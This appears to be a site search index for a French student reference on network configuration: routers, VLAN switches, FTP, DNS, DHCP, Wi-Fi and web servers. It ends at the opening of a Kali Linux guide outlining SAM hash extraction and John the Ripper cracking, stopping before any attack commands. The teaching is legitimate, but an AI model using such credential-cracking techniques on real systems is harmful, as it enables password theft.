{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Guide de Configuration R\u00e9seau","text":"<p>R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u2014 Configuration pratique des composants r\u00e9seau essentiels</p>"},{"location":"#table-des-matieres","title":"Table des Mati\u00e8res","text":"# Sujet Protocole / Couche 01 Routeur Couche 3 \u2014 Routage IP 02 Commutateur r\u00e9seau Couche 2 \u2014 MAC / VLANs 03 Serveur FTP TCP Port 21 04 Serveur DNS UDP/TCP Port 53 05 Serveur DHCP UDP Port 67/68 06 Point d'Acc\u00e8s Sans Fil IEEE 802.11 07 Serveur Web (Apache / Nginx) TCP Port 80 / 443"},{"location":"#01-routeur","title":"01 \u2014 Routeur","text":"<p>\u00c9quipement de couche 3 qui achemine les paquets entre diff\u00e9rents r\u00e9seaux en utilisant l'adressage IP et les tables de routage.</p>"},{"location":"#quest-ce-quun-routeur","title":"Qu'est-ce qu'un Routeur ?","text":"<p>Un routeur fonctionne \u00e0 la couche 3 (couche R\u00e9seau) du mod\u00e8le OSI. Son r\u00f4le principal est de transf\u00e9rer les paquets de donn\u00e9es entre diff\u00e9rents r\u00e9seaux \u2014 g\u00e9n\u00e9ralement entre votre r\u00e9seau local (LAN) et Internet (WAN). Il utilise une table de routage pour d\u00e9terminer le meilleur chemin pour chaque paquet.</p> <p>Concept cl\u00e9 : Les routeurs s\u00e9parent les domaines de diffusion. Chaque interface d'un routeur repr\u00e9sente un segment r\u00e9seau distinct.</p>"},{"location":"#schema-reseau","title":"Sch\u00e9ma R\u00e9seau","text":"<pre><code>    [Internet / FAI]\n          \u2502\n      \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510\n      \u2502ROUTEUR\u2502  \u2190 192.168.1.1 (passerelle)\n      \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2518\n          \u2502 LAN\n   \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n      \u2502         \u2502          \u2502\n   [PC1]      [PC2]    [Serveur]\n  .10          .20       .100\n</code></pre>"},{"location":"#configuration-cisco-ios","title":"Configuration \u2014 Cisco IOS","text":"<p>\u00c9tape 1 \u2014 Connexion via Console</p> <p>Utilisez un c\u00e2ble console (rollover) entre votre PC et le port console du routeur. Ouvrez un \u00e9mulateur de terminal (PuTTY, SecureCRT) \u00e0 9600 bauds, 8N1.</p> <p>\u00c9tape 2 \u2014 Passer en Mode Privil\u00e9gi\u00e9</p> <pre><code>Router&gt; enable\nRouter# configure terminal\n</code></pre> <p>\u00c9tape 3 \u2014 D\u00e9finir le Nom d'H\u00f4te et le Mot de Passe</p> <pre><code>Router(config)# hostname MonRouteur\nMonRouteur(config)# enable secret MotDePasseFort123\nMonRouteur(config)# service password-encryption\n</code></pre> <p>\u00c9tape 4 \u2014 Configurer l'Interface LAN</p> <pre><code>MonRouteur(config)# interface GigabitEthernet0/0\nMonRouteur(config-if)# ip address 192.168.1.1 255.255.255.0\nMonRouteur(config-if)# no shutdown\nMonRouteur(config-if)# description Interface LAN\n</code></pre> <p>\u00c9tape 5 \u2014 Configurer l'Interface WAN et la Route par D\u00e9faut</p> <pre><code>MonRouteur(config)# interface GigabitEthernet0/1\nMonRouteur(config-if)# ip address dhcp\nMonRouteur(config-if)# no shutdown\nMonRouteur(config)# ip route 0.0.0.0 0.0.0.0 GigabitEthernet0/1\n</code></pre> <p>\u00c9tape 6 \u2014 Sauvegarder la Configuration</p> <pre><code>MonRouteur# copy running-config startup-config\n</code></pre> <p>Termes cl\u00e9s : <code>Table de routage</code> \u00b7 <code>NAT</code> \u00b7 <code>WAN</code> \u00b7 <code>Passerelle par d\u00e9faut</code> \u00b7 <code>Cisco IOS</code></p>"},{"location":"#02-commutateur-reseau","title":"02 \u2014 Commutateur R\u00e9seau","text":"<p>\u00c9quipement de couche 2 qui interconnecte les appareils d'un m\u00eame r\u00e9seau gr\u00e2ce \u00e0 l'apprentissage des adresses MAC et \u00e0 la segmentation optionnelle en VLANs.</p>"},{"location":"#quest-ce-quun-commutateur","title":"Qu'est-ce qu'un Commutateur ?","text":"<p>Un commutateur fonctionne \u00e0 la couche 2 (couche Liaison de donn\u00e9es). Il apprend les adresses MAC et transmet les trames uniquement vers le port destinataire \u2014 contrairement \u00e0 un hub qui diffuse vers tous les ports. Les commutateurs administrables modernes supportent les VLANs, STP, QoS et la mise en miroir de ports.</p> Type Configuration Cas d'utilisation Non administrable Aucune Petits r\u00e9seaux domestiques/bureaux Administrable Requise (CLI ou interface web) Entreprise, VLANs, supervision"},{"location":"#architecture-vlan","title":"Architecture VLAN","text":"<pre><code>  Commutateur (24 ports)\n  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n  \u2502  VLAN 10 \u2014 Ports  1\u20138   \u2502  \u2190 Personnel\n  \u2502  VLAN 20 \u2014 Ports  9\u201316  \u2502  \u2190 \u00c9tudiants\n  \u2502  VLAN 99 \u2014 Port   24    \u2502  \u2190 Gestion\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        Port trunk \u2192 Routeur (marquage 802.1Q)\n</code></pre>"},{"location":"#configuration-commutateur-administrable-cisco","title":"Configuration \u2014 Commutateur Administrable Cisco","text":"<p>\u00c9tape 1 \u2014 Cr\u00e9er les VLANs</p> <pre><code>Switch(config)# vlan 10\nSwitch(config-vlan)# name PERSONNEL\nSwitch(config)# vlan 20\nSwitch(config-vlan)# name ETUDIANTS\n</code></pre> <p>\u00c9tape 2 \u2014 Affecter les Ports d'Acc\u00e8s aux VLANs</p> <pre><code>Switch(config)# interface range Fa0/1 - 8\nSwitch(config-if-range)# switchport mode access\nSwitch(config-if-range)# switchport access vlan 10\n</code></pre> <p>\u00c9tape 3 \u2014 Configurer le Port Trunk (vers le Routeur)</p> <pre><code>Switch(config)# interface Fa0/24\nSwitch(config-if)# switchport mode trunk\nSwitch(config-if)# switchport trunk allowed vlan 10,20,99\n</code></pre> <p>\u00c9tape 4 \u2014 D\u00e9finir l'Adresse IP de Gestion</p> <pre><code>Switch(config)# interface vlan 99\nSwitch(config-if)# ip address 192.168.99.2 255.255.255.0\nSwitch(config-if)# no shutdown\n</code></pre> <p>Remarque : Configurez toujours un VLAN de gestion distinct des VLANs utilisateurs pour l'acc\u00e8s distant via SSH ou l'interface web.</p> <p>Termes cl\u00e9s : <code>VLAN</code> \u00b7 <code>Trunk 802.1Q</code> \u00b7 <code>STP</code> \u00b7 <code>Table MAC</code> \u00b7 <code>Port d'acc\u00e8s</code></p>"},{"location":"#03-serveur-ftp","title":"03 \u2014 Serveur FTP","text":"<p>File Transfer Protocol \u2014 permet le transfert de fichiers sur un r\u00e9seau via <code>vsftpd</code> sous Linux.</p>"},{"location":"#fonctionnement-du-ftp","title":"Fonctionnement du FTP","text":"<p>Le FTP utilise deux canaux distincts :</p> <ul> <li>Canal de contr\u00f4le (port 21) \u2014 pour l'authentification et les commandes</li> <li>Canal de donn\u00e9es (port 20 actif / port n\u00e9goci\u00e9 passif) \u2014 pour le transfert effectif des fichiers</li> </ul> Mode Connexion de donn\u00e9es NAT/Pare-feu Actif Serveur \u2192 Client (port 20) \u274c \u00c9choue avec le NAT Passif Client \u2192 Serveur (port \u00e9lev\u00e9) \u2705 Fonctionne avec le NAT <p>\u26a0\ufe0f Avertissement de s\u00e9curit\u00e9 : Le FTP standard transmet les identifiants en texte clair. En production, utilisez SFTP (port 22, via SSH) ou FTPS (FTP sur TLS). R\u00e9servez le FTP classique aux r\u00e9seaux de laboratoire isol\u00e9s.</p>"},{"location":"#configuration-vsftpd-sur-ubuntu","title":"Configuration \u2014 vsftpd sur Ubuntu","text":"<p>\u00c9tape 1 \u2014 Installer vsftpd</p> <pre><code>sudo apt update &amp;&amp; sudo apt install vsftpd -y\nsudo systemctl enable vsftpd\n</code></pre> <p>\u00c9tape 2 \u2014 Modifier le Fichier de Configuration</p> <pre><code>sudo nano /etc/vsftpd.conf\n</code></pre> <p>Ajoutez ou d\u00e9commentez les lignes suivantes :</p> <pre><code># Autoriser les utilisateurs locaux \u00e0 \u00e9crire des fichiers\nwrite_enable=YES\n\n# Confiner les utilisateurs dans leur r\u00e9pertoire personnel\nchroot_local_user=YES\nallow_writeable_chroot=YES\n\n# Activer le mode passif pour la compatibilit\u00e9 NAT\npasv_enable=YES\npasv_min_port=40000\npasv_max_port=40100\n</code></pre> <p>\u00c9tape 3 \u2014 Cr\u00e9er un Utilisateur FTP et son R\u00e9pertoire</p> <pre><code>sudo adduser utilisateurftp\nsudo mkdir -p /home/utilisateurftp/fichiers\nsudo chown nobody:nogroup /home/utilisateurftp\nsudo chown utilisateurftp:utilisateurftp /home/utilisateurftp/fichiers\n</code></pre> <p>\u00c9tape 4 \u2014 Ouvrir les Ports du Pare-feu et Red\u00e9marrer</p> <pre><code>sudo ufw allow 21/tcp\nsudo ufw allow 40000:40100/tcp\nsudo systemctl restart vsftpd\n</code></pre> <p>\u00c9tape 5 \u2014 Tester la Connexion</p> <pre><code>ftp 192.168.1.20\n# ou utiliser FileZilla avec le mode passif activ\u00e9\n</code></pre> <p>Termes cl\u00e9s : <code>vsftpd</code> \u00b7 <code>Port 21</code> \u00b7 <code>Mode passif</code> \u00b7 <code>chroot</code> \u00b7 <code>SFTP</code></p>"},{"location":"#04-serveur-dns","title":"04 \u2014 Serveur DNS","text":"<p>Domain Name System \u2014 r\u00e9sout les noms d'h\u00f4tes en adresses IP via <code>BIND9</code> sous Linux.</p>"},{"location":"#fonctionnement-de-la-resolution-dns","title":"Fonctionnement de la R\u00e9solution DNS","text":"<pre><code> Le navigateur demande : \"quelle est l'IP de webserver.lab.local ?\"\n        \u2502\n   \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502R\u00e9solveur \u2502  \u2192 v\u00e9rifie le cache local d'abord\n   \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n        \u2502 absence dans le cache\n   \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502    BIND9 DNS      \u2502  192.168.1.53\n   \u2502  (autoritaire)    \u2502\n   \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        \u2502 correspondance trouv\u00e9e dans le fichier de zone\n        \u25bc\n   Retourne : 192.168.1.10  \u2713\n</code></pre>"},{"location":"#types-denregistrements-dns-courants","title":"Types d'Enregistrements DNS Courants","text":"Enregistrement R\u00f4le Exemple <code>A</code> Nom d'h\u00f4te \u2192 IPv4 <code>webserver \u2192 192.168.1.10</code> <code>AAAA</code> Nom d'h\u00f4te \u2192 IPv6 <code>webserver \u2192 ::1</code> <code>CNAME</code> Alias vers un autre nom d'h\u00f4te <code>www \u2192 webserver</code> <code>MX</code> Serveur de messagerie du domaine <code>@ \u2192 mail.lab.local</code> <code>PTR</code> R\u00e9solution inverse (IP \u2192 nom) <code>10 \u2192 webserver.lab.local</code> <code>NS</code> Serveur de noms autoritaire <code>@ \u2192 ns1.lab.local</code> <code>SOA</code> Enregistrement d'autorit\u00e9 de zone D\u00e9but du fichier de zone"},{"location":"#configuration-bind9-sur-ubuntu","title":"Configuration \u2014 BIND9 sur Ubuntu","text":"<p>\u00c9tape 1 \u2014 Installer BIND9</p> <pre><code>sudo apt install bind9 bind9utils bind9-doc -y\n</code></pre> <p>\u00c9tape 2 \u2014 D\u00e9clarer la Zone</p> <p>\u00c9ditez <code>/etc/bind/named.conf.local</code> :</p> <pre><code>zone \"lab.local\" {\n    type master;\n    file \"/etc/bind/zones/db.lab.local\";\n};\n</code></pre> <p>\u00c9tape 3 \u2014 Cr\u00e9er le Fichier de Zone</p> <pre><code>sudo mkdir -p /etc/bind/zones\nsudo nano /etc/bind/zones/db.lab.local\n</code></pre> <pre><code>$TTL    604800\n@  IN  SOA  ns1.lab.local. admin.lab.local. (\n              2025010101 ; Num\u00e9ro de s\u00e9rie  \u2190 \u00e0 incr\u00e9menter apr\u00e8s chaque modification\n              604800     ; Rafra\u00eechissement\n              86400      ; Nouvelle tentative\n              2419200    ; Expiration\n              604800 )   ; TTL minimum\n\n; Enregistrement du serveur de noms\n@       IN  NS    ns1.lab.local.\nns1     IN  A     192.168.1.53\n\n; Enregistrements A des h\u00f4tes\nrouter      IN  A   192.168.1.1\nwebserver   IN  A   192.168.1.10\nfileserver  IN  A   192.168.1.20\n\n; Alias CNAME\nwww     IN  CNAME  webserver\n</code></pre> <p>\u00c9tape 4 \u2014 Valider et Red\u00e9marrer</p> <pre><code>sudo named-checkconf\nsudo named-checkzone lab.local /etc/bind/zones/db.lab.local\n\nsudo systemctl restart bind9\n</code></pre> <p>\u00c9tape 5 \u2014 Tester la R\u00e9solution</p> <pre><code>nslookup webserver.lab.local 192.168.1.53\ndig @192.168.1.53 www.lab.local\n</code></pre> <p>Conseil : Incr\u00e9mentez toujours le num\u00e9ro de s\u00e9rie apr\u00e8s avoir modifi\u00e9 un fichier de zone, sinon les serveurs DNS secondaires ne prendront pas en compte vos changements.</p> <p>Termes cl\u00e9s : <code>BIND9</code> \u00b7 <code>Fichier de zone</code> \u00b7 <code>Enregistrement A</code> \u00b7 <code>SOA</code> \u00b7 <code>Port 53</code> \u00b7 <code>nslookup</code></p>"},{"location":"#05-serveur-dhcp","title":"05 \u2014 Serveur DHCP","text":"<p>Dynamic Host Configuration Protocol \u2014 attribue automatiquement des adresses IP et la configuration r\u00e9seau aux clients via <code>isc-dhcp-server</code>.</p>"},{"location":"#le-processus-dora","title":"Le Processus DORA","text":"<pre><code> Client                        Serveur DHCP\n   \u2502                                \u2502\n   \u251c\u2500\u2500\u2500\u2500 DISCOVER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502  \"Y a-t-il un serveur ? J'ai besoin d'une IP.\"\n   \u2502\u25c0\u2500\u2500\u2500 OFFER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502  \"Je vous propose 192.168.1.105\"\n   \u251c\u2500\u2500\u2500\u2500 REQUEST \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502  \"J'accepte 192.168.1.105, merci.\"\n   \u2502\u25c0\u2500\u2500\u2500 ACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524  \"Confirm\u00e9 \u2014 bail valide 24h.\"\n   \u2502                                \u2502\n</code></pre>"},{"location":"#ce-que-le-dhcp-attribue","title":"Ce que le DHCP Attribue","text":"<ul> <li>Adresse IP \u2014 depuis une plage d\u00e9finie (pool)</li> <li>Masque de sous-r\u00e9seau \u2014 pour le segment r\u00e9seau</li> <li>Passerelle par d\u00e9faut \u2014 l'adresse IP du routeur</li> <li>Serveur(s) DNS \u2014 pour la r\u00e9solution de noms</li> <li>Dur\u00e9e du bail \u2014 d\u00e9lai avant renouvellement</li> </ul>"},{"location":"#configuration-isc-dhcp-server-sur-ubuntu","title":"Configuration \u2014 isc-dhcp-server sur Ubuntu","text":"<p>\u00c9tape 1 \u2014 Installer le Paquet</p> <pre><code>sudo apt install isc-dhcp-server -y\n</code></pre> <p>\u00c9tape 2 \u2014 D\u00e9finir l'Interface d'\u00c9coute</p> <p>\u00c9ditez <code>/etc/default/isc-dhcp-server</code> :</p> <pre><code>INTERFACESv4=\"eth0\"\n</code></pre> <p>\u00c9tape 3 \u2014 Configurer le Sous-r\u00e9seau et la Plage d'Adresses</p> <p>\u00c9ditez <code>/etc/dhcp/dhcpd.conf</code> :</p> <pre><code>default-lease-time 86400;    # 24 heures\nmax-lease-time 172800;       # 48 heures maximum\n\nsubnet 192.168.1.0 netmask 255.255.255.0 {\n  range 192.168.1.100 192.168.1.200;        # plage d'adresses IP\n  option routers 192.168.1.1;               # passerelle par d\u00e9faut\n  option domain-name-servers 192.168.1.53, 8.8.8.8;\n  option domain-name \"lab.local\";\n}\n\n# R\u00e9servation statique par adresse MAC (ex. pour une imprimante)\nhost imprimante {\n  hardware ethernet AA:BB:CC:DD:EE:FF;\n  fixed-address 192.168.1.50;\n}\n</code></pre> <p>\u00c9tape 4 \u2014 D\u00e9marrer et Surveiller</p> <pre><code>sudo systemctl restart isc-dhcp-server\nsudo systemctl status isc-dhcp-server\n\n# Afficher les baux actifs\ncat /var/lib/dhcp/dhcpd.leases\n</code></pre> <p>Conseil pratique : Utilisez les r\u00e9servations statiques (liaison IP + MAC) pour les serveurs et imprimantes afin qu'ils re\u00e7oivent toujours la m\u00eame adresse IP sans configuration statique manuelle sur l'\u00e9quipement.</p> <p>Termes cl\u00e9s : <code>DORA</code> \u00b7 <code>Bail</code> \u00b7 <code>Plage IP</code> \u00b7 <code>R\u00e9servation</code> \u00b7 <code>Port 67/68</code></p>"},{"location":"#06-point-dacces-sans-fil","title":"06 \u2014 Point d'Acc\u00e8s Sans Fil","text":"<p>\u00c9quipement IEEE 802.11 qui \u00e9tend un r\u00e9seau filaire aux clients sans fil sans assurer de routage.</p>"},{"location":"#pap-vs-autres-equipements","title":"PAP vs Autres \u00c9quipements","text":"\u00c9quipement Routage Wi-Fi Cas d'utilisation PAP (WAP) \u274c \u2705 \u00c9tend un LAN filaire existant Routeur sans fil \u2705 \u2705 Appareil tout-en-un pour la maison R\u00e9p\u00e9teur/Amplificateur \u274c \u2705 Rediffuse le signal existant (ajoute de la latence) N\u0153ud Mesh \u274c \u2705 Itin\u00e9rance transparente sur de grandes surfaces"},{"location":"#comparatif-des-normes-80211","title":"Comparatif des Normes 802.11","text":"Norme Nom Wi-Fi D\u00e9bit max Fr\u00e9quence 802.11n Wi-Fi 4 600 Mbps 2,4 / 5 GHz 802.11ac Wi-Fi 5 3,5 Gbps 5 GHz 802.11ax Wi-Fi 6 9,6 Gbps 2,4 / 5 / 6 GHz 802.11be Wi-Fi 7 46 Gbps Multi-bande <p>S\u00e9curit\u00e9 minimale : Utilisez toujours WPA2-Personal ou sup\u00e9rieur. Pr\u00e9f\u00e9rez WPA3 si disponible. N'utilisez jamais WEP ni les r\u00e9seaux ouverts.</p>"},{"location":"#configuration-interface-web-generique-ubiquiti-cisco-tp-link","title":"Configuration \u2014 Interface Web G\u00e9n\u00e9rique (Ubiquiti / Cisco / TP-Link)","text":"<p>\u00c9tape 1 \u2014 Connexion Physique</p> <p>Branchez le PAP sur un port de commutateur PoE (ou utilisez un injecteur PoE). Un seul c\u00e2ble Cat5e/Cat6 fournit \u00e0 la fois l'alimentation et les donn\u00e9es. V\u00e9rifiez que le port est bien affect\u00e9 au bon VLAN.</p> <p>\u00c9tape 2 \u2014 Acc\u00e9der \u00e0 l'Interface d'Administration</p> <pre><code># Acc\u00e8s par d\u00e9faut selon la marque :\nUbiquiti UniFi  \u2192  Adoption via l'application UniFi Controller\nCisco WAP       \u2192  https://192.168.1.1  (voir l'\u00e9tiquette)\nTP-Link EAP     \u2192  https://192.168.0.254\n\nIdentifiants par d\u00e9faut : admin / admin\n\u26a0 \u00c0 modifier imm\u00e9diatement apr\u00e8s la premi\u00e8re connexion !\n</code></pre> <p>\u00c9tape 3 \u2014 Cr\u00e9er le R\u00e9seau Sans Fil (SSID)</p> <pre><code>Nom SSID :    ReseauLabo_5G\nBande :       5 GHz  (ou double bande)\nS\u00e9curit\u00e9 :    WPA2-Personal  (WPA3 si disponible)\nMot de passe : [minimum 12 caract\u00e8res, mixte]\nTag VLAN :    20  (optionnel, pour la segmentation r\u00e9seau)\n</code></pre> <p>\u00c9tape 4 \u2014 Configurer le Canal et la Puissance d'\u00c9mission</p> <pre><code>2,4 GHz \u2192 Utiliser les canaux 1, 6 ou 11 (sans chevauchement)\n5 GHz   \u2192 Activer le Canal Auto (les canaux DFS sont acceptables)\n\nLargeur de canal :  40 MHz (2,4 GHz)  /  80 MHz (5 GHz)\nPuissance TX :      Auto ou Moyen  \u2190 \u00e9viter le Maximum dans les environnements denses\n</code></pre> <p>\u00c9tape 5 \u2014 Activer le R\u00e9seau Invit\u00e9 (Optionnel)</p> <p>Cr\u00e9ez un second SSID associ\u00e9 \u00e0 un VLAN isol\u00e9. Activez l'isolation des clients pour emp\u00eacher les invit\u00e9s de communiquer entre eux ou d'acc\u00e9der au LAN principal. Routez le trafic invit\u00e9 vers un sous-r\u00e9seau distinct avec acc\u00e8s Internet uniquement.</p> <p>Termes cl\u00e9s : <code>SSID</code> \u00b7 <code>WPA3</code> \u00b7 <code>PoE</code> \u00b7 <code>Canal</code> \u00b7 <code>VLAN</code> \u00b7 <code>Isolation des clients</code></p>"},{"location":"#07-serveur-web-apache-nginx","title":"07 \u2014 Serveur Web (Apache / Nginx)","text":"<p>Serveur HTTP/HTTPS qui sert du contenu web aux navigateurs, configur\u00e9 via Apache2 ou Nginx sous Linux.</p>"},{"location":"#apache-vs-nginx","title":"Apache vs Nginx","text":"Fonctionnalit\u00e9 Apache Nginx Architecture Bas\u00e9e sur les processus \u00c9v\u00e9nementielle (asynchrone) Configuration Par r\u00e9pertoire <code>.htaccess</code> Configuration centralis\u00e9e Support PHP Natif (mod_php) Via PHP-FPM Performances Bon pour le contenu dynamique Excellent pour les fichiers statiques et la forte charge Proxy inverse Support\u00e9 Excellent Id\u00e9al pour H\u00e9bergement mutualis\u00e9, apps PHP Sites \u00e0 fort trafic, microservices"},{"location":"#concept-dhote-virtuel","title":"Concept d'H\u00f4te Virtuel","text":"<pre><code>  Requ\u00eate entrante : GET http://site-a.lab.local\n\n        \u2502\n  \u250c\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n  \u2502           Serveur Web               \u2502\n  \u2502                                     \u2502\n  \u2502  VHost: site-a.lab.local  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 /var/www/site-a  \u2502\n  \u2502  VHost: site-b.lab.local  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 /var/www/site-b  \u2502\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n  Une seule adresse IP \u2192 Plusieurs sites web\n</code></pre>"},{"location":"#configuration-apache2-sur-ubuntu","title":"Configuration \u2014 Apache2 sur Ubuntu","text":"<p>\u00c9tape 1 \u2014 Installer Apache2</p> <pre><code>sudo apt install apache2 -y\nsudo systemctl enable apache2\n# V\u00e9rification : ouvrir http://192.168.1.10 \u2192 page par d\u00e9faut d'Apache\n</code></pre> <p>\u00c9tape 2 \u2014 Cr\u00e9er un Fichier d'H\u00f4te Virtuel</p> <pre><code>sudo nano /etc/apache2/sites-available/site-a.conf\n</code></pre> <pre><code>&lt;VirtualHost *:80&gt;\n    ServerName    site-a.lab.local\n    DocumentRoot  /var/www/site-a\n\n    ErrorLog   ${APACHE_LOG_DIR}/site-a-error.log\n    CustomLog  ${APACHE_LOG_DIR}/site-a-access.log combined\n&lt;/VirtualHost&gt;\n</code></pre> <p>\u00c9tape 3 \u2014 Cr\u00e9er la Racine Web et Activer le Site</p> <pre><code>sudo mkdir -p /var/www/site-a\necho \"&lt;h1&gt;Le Site A fonctionne !&lt;/h1&gt;\" | sudo tee /var/www/site-a/index.html\n\nsudo a2ensite site-a.conf\nsudo systemctl reload apache2\n</code></pre> <p>\u00c9tape 4 \u2014 Activer HTTPS</p> <pre><code># Option A \u2014 Certificat auto-sign\u00e9 (pour labs/usage interne) :\nsudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\\n  -keyout /etc/ssl/private/lab.key \\\n  -out /etc/ssl/certs/lab.crt\n\nsudo a2enmod ssl\n# Puis ajouter les directives SSL dans le VirtualHost sur le port 443\n\n# Option B \u2014 Let's Encrypt (pour les serveurs publics) :\nsudo apt install certbot python3-certbot-apache\nsudo certbot --apache\n</code></pre>"},{"location":"#configuration-nginx-sur-ubuntu","title":"Configuration \u2014 Nginx sur Ubuntu","text":"<p>\u00c9tape 1 \u2014 Installer Nginx</p> <pre><code>sudo apt install nginx -y\nsudo systemctl enable nginx\n</code></pre> <p>\u00c9tape 2 \u2014 Cr\u00e9er un Bloc Serveur</p> <pre><code>sudo nano /etc/nginx/sites-available/site-a\n</code></pre> <pre><code>server {\n    listen 80;\n    server_name site-a.lab.local;\n\n    root  /var/www/site-a;\n    index index.html;\n\n    access_log /var/log/nginx/site-a-access.log;\n    error_log  /var/log/nginx/site-a-error.log;\n}\n</code></pre> <p>\u00c9tape 3 \u2014 Activer le Site et Recharger</p> <pre><code>sudo ln -s /etc/nginx/sites-available/site-a /etc/nginx/sites-enabled/\nsudo nginx -t          # tester la syntaxe de la configuration\nsudo systemctl reload nginx\n</code></pre> <p>Termes cl\u00e9s : <code>H\u00f4te virtuel</code> \u00b7 <code>DocumentRoot</code> \u00b7 <code>TLS/SSL</code> \u00b7 <code>Let's Encrypt</code> \u00b7 <code>Port 80/443</code> \u00b7 <code>Certbot</code></p>"},{"location":"#reference-rapide-ports-et-protocoles","title":"R\u00e9f\u00e9rence Rapide \u2014 Ports et Protocoles","text":"Service Protocole Port(s) Remarques Contr\u00f4le FTP TCP 21 Authentification et commandes Donn\u00e9es FTP (Actif) TCP 20 Connexion initi\u00e9e par le serveur Donn\u00e9es FTP (Passif) TCP 40000\u201340100 Connexion initi\u00e9e par le client ; compatible NAT SSH / SFTP TCP 22 Alternative chiffr\u00e9e au FTP DNS UDP / TCP 53 UDP pour les requ\u00eates, TCP pour les transferts de zone Serveur DHCP UDP 67 Le serveur \u00e9coute Client DHCP UDP 68 Le client \u00e9coute HTTP TCP 80 Trafic web non chiffr\u00e9 HTTPS TCP 443 Trafic web chiffr\u00e9 via TLS"},{"location":"#commandes-de-diagnostic-utiles","title":"Commandes de Diagnostic Utiles","text":"<pre><code># Tester la r\u00e9solution DNS\nnslookup webserver.lab.local 192.168.1.53\ndig @192.168.1.53 site-a.lab.local\n\n# V\u00e9rifier les ports ouverts sur un serveur\nss -tulnp\nnetstat -tulnp\n\n# Tester la r\u00e9ponse HTTP\ncurl -I http://site-a.lab.local\n\n# Afficher les baux DHCP\ncat /var/lib/dhcp/dhcpd.leases\n\n# V\u00e9rifier l'\u00e9tat d'un service (remplacer par le service souhait\u00e9)\nsudo systemctl status bind9\nsudo systemctl status apache2\n\n# Consulter les journaux en temps r\u00e9el\nsudo tail -f /var/log/apache2/site-a-access.log\nsudo journalctl -u nginx -f\n\n# Ping / traceroute\nping 192.168.1.1\ntraceroute 8.8.8.8\n</code></pre> <p>Guide de Configuration R\u00e9seau \u00b7 R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u00b7 2025</p>"},{"location":"kali/","title":"Guide Kali Linux &amp; Attaque de la Base SAM","text":"<p>R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u2014 S\u00e9curit\u00e9 offensive et tests de p\u00e9n\u00e9tration</p> <p>\u26a0\ufe0f Avertissement l\u00e9gal : Les techniques pr\u00e9sent\u00e9es dans ce document sont \u00e0 des fins strictement \u00e9ducatives dans un environnement de laboratoire isol\u00e9. Toute utilisation sur des syst\u00e8mes sans autorisation explicite est ill\u00e9gale et passible de poursuites p\u00e9nales. Ne pratiquez que sur vos propres machines ou dans un cadre p\u00e9dagogique autoris\u00e9.</p>"},{"location":"kali/#table-des-matieres","title":"Table des Mati\u00e8res","text":"# Sujet 01 Installation de Kali Linux 02 Pr\u00e9sentation de la base SAM 03 Extraction des hachages SAM 04 Attaque par dictionnaire avec John the Ripper 05 Attaque par force brute avec John the Ripper 06 Analyse des r\u00e9sultats 07 Commandes de r\u00e9f\u00e9rence rapide"},{"location":"kali/#01-installation-de-kali-linux","title":"01 \u2014 Installation de Kali Linux","text":""},{"location":"kali/#prerequis","title":"Pr\u00e9requis","text":"Composant Minimum Recommand\u00e9 RAM 2 Go 4 Go ou plus Stockage 20 Go 50 Go ou plus Processeur x64 double c\u0153ur x64 quad-c\u0153ur R\u00e9seau Facultatif Recommand\u00e9"},{"location":"kali/#options-dinstallation","title":"Options d'installation","text":"<p>Il existe trois m\u00e9thodes principales pour installer Kali Linux :</p> <ul> <li>Machine virtuelle (VM) \u2014 id\u00e9al pour les d\u00e9butants, installation sur VirtualBox ou VMware sans affecter le syst\u00e8me h\u00f4te</li> <li>Dual boot \u2014 Kali 